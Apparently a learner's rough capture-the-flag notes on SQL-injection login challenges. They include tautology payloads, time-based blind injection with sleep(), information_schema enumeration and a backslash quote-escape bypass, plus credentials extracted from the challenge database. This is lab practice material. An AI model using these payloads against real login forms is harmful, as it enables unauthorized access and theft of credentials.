' OR 1=1 -- test, filters out the OR I think

1' + (SELECT sleep(3) from users) -- test
Table name is users since user did not hang
We did ' || 1=1 -- test 
it worked lol

Login 3

' || 1=1 -- test 
now says disabled guest logins, assume this means I actually have to match to a real login name
' + (SELECT sleep(3) from users) -- test
' + (SELECT sleep(3) from users WHERE ) -- test

First need to enumerate the column names

' + (SELECT IF (SUBSTR(SELECT username FROM users LIMIT 1, 1, 1)='a',sleep(5),1)) -- test

SELECT username, password FROM users WHERE username = " " " and password = " "
' || 1=1 

' + (SELECT IF((SELECT username FROM users LIMIT 1),sleep(5),1)) '

' + (SELECT password FROM users LIMIT 1 OFFSET 1) -- c
' + (SELECT password FROM users LIMIT 1 OFFSET 2) OR 1=1-- c worked so must just be first account disabled?

must be WHERE password = "" and username = ""

' + (IF(SUBSTR(  (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 1),1,1)='a' ,sleep(3),1))-- c
this worked and I enumerated the column name as username

Enumerated this part of the table

UID | USERNAME          | PASSWORD           |
        GUEST
        ASDASFSADFASAS   RKIGRJMGKLSADXCVVE

The password was in clear text, I used it to login and got the flag

#update this was not the way to solve this, and it is now 
' + (SELECT username FROM users LIMIT 1 OFFSET 1)-- c



Login 4:

' + (SELECT password FROM users LIMIT 1 OFFSET 2) OR 1=1-- c  
got SQLi detected.
' this char triggers it
a backslash breaks it \
but two \\ works.
Indicates that the query is probably something like 
SELECT username,password FROM users where username = " '\" and password = "' \"

The first slash breaks it because now there are three interpreted quotes. But if we also but a backslash in the password then the string being
matched to the username is username = { \" and password = "} meaning whatever we put at the start of password can be executable i.e.
SELECT username,password FROM users where username = " \" and password = " OR 1=1; -- c \"

LOGIN 5

SELECT username, password FROM users WHERE username = "" and password = "" OR 1=1; -- c" Logs in but with wrong password for admin?

It must be that admin has more than one password maybe?

SELECT username, password FROM users WHERE username = "" OR 1=1 UNION " and password = ""

I think best to try enumerate the database

SELECT username, password FROM users WHERE username = "'OR (SELECT sleep(10)); -- c" and password = ""
sleep worked.
'OR (SELECT sleep(10)); -- c

UID | USERNAME          | PASSWORD           |
        ADMIN                  KINDA-WEAK-PASSWORD6

Found another table
ADMINISTRABLE_ROLE_AUTHORIZATIONS
